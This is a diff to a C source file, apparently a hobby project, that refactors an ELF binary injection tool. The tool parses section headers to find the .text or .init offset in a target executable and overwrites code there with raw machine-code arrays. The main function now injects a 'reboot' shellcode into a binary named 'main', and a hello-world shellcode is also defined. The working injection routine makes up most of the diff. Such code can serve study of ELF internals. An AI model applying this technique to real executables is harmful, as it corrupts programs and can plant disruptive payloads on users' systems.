@@ -21,7 +21,8 @@ const char program_header[] = "\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\
 const char Hello_word[]  = "\xB8\x01\x00\x00\x00\xBF\x01\x00\x00\x00\x48\x8D\x35\x10\x00\x00\x00\xBA\x0D\x00\x00\x00\x0F\x05\xB8\x3C\x00\x00\x00\x31\xFF\x0F\x05helloworld\n";
 
 
-int browse_header(char *target,char *section_to_inject){
+int inject_instruction(char *target,char *section_to_inject, char *instruction,int inst_size)
+{
 
 	int flag = S_IRWXU | S_IRWXO; 
 	int fd = open(target,O_RDONLY,flag);
@@ -51,7 +52,7 @@ int browse_header(char *target,char *section_to_inject){
 	fd = -1;
 	/*here we have the target program in memory*/
 	
-	/*FIND the initialization code offset in the file(program)*/	
+	/*FIND the section_to_inject  offset in the file(program)*/	
 	
 	off_t section_header_start = 0;
 	memcpy(&section_header_start,&cpy[SHOFF],sizeof(off_t));
@@ -76,10 +77,11 @@ int browse_header(char *target,char *section_to_inject){
 	memcpy(strtbl,&cpy[sh_strtbl_off],sh_strtbl_sz);
 	
 	/*read section header to understand where to inject the code
-		you can inject in .init or .text sections */
+		 you can inject in .init or .text sections */
 
 	int i = 0;
 	ssize_t bread = section_header_start;
+	off_t offset = 0;
 	while(i < sh_num){
 		uint32_t sh_name = 0;	
 		memcpy(&sh_name,&cpy[bread],sizeof(uint32_t));
@@ -90,45 +92,36 @@ int browse_header(char *target,char *section_to_inject){
 		}
 
 		if(strncmp(section_to_inject,&strtbl[sh_name],strlen(section_to_inject)) == 0){
-			off_t offset = 0;
 			memcpy(&offset,&cpy[bread+0x18],sizeof(off_t));
-			if(offset) return offset;
+			if(offset) break;
 		}
 		bread += 64;
 		i++;
 		continue;
 	}	
+	fd = open(target,O_WRONLY,flag);
+	if(fd == -1){
+		printf("cannot create the program\n");
+		return 0;
+	}
+
+	if(lseek(fd,offset,SEEK_SET) == -1){
+		close(fd);
+		return 1;
+	}
+
+	/*INJECTION*/
+	int r = write(fd,instruction,inst_size);
+	close(fd);
+
+	if(r == -1) return -1;
 	return 0;
 }
 
 
 int main(){
 
-	//copy_header(&fd);
-	off_t inject_spot = browse_header("CIAO_pie",".text");
-	if(!inject_spot) return 0;
-
-	int flag = S_IRWXU | S_IRWXO; 
-	int fd = open("CIAO_pie",O_WRONLY,flag);
-	if(fd == -1){
-		printf("cannot create the program\n");
-		return 0;
-	}
-
-	if(lseek(fd,inject_spot,SEEK_SET) == -1){
-		close(fd);
-		return 1;
-	}
-
-	/*INJECTION*/
-	write(fd,reboot,sizeof(reboot)-1);	
-	close(fd);
-	//write(fd,ELF_h,sizeof(ELF_h)-1);	
-	//write(fd,program_header,sizeof(program_header)-1);	
-#if 0
-	printf("instruction Hello_word is %ld bytes\n",sizeof(Hello_word)-1);
-	printf("instruction reboot is %ld bytes\n",sizeof(reboot)-1);
-	printf("all program will be ELF header + program header + instrunctions = %ld",sizeof(ELF_h) -1 + sizeof(program_header)-1 +sizeof(Hello_word)-1);
-#endif
+	int r = inject_instruction("main",".text",(char*)reboot,sizeof(reboot)-1);
+	if(r == -1) return -1;
 	return 0;
 }
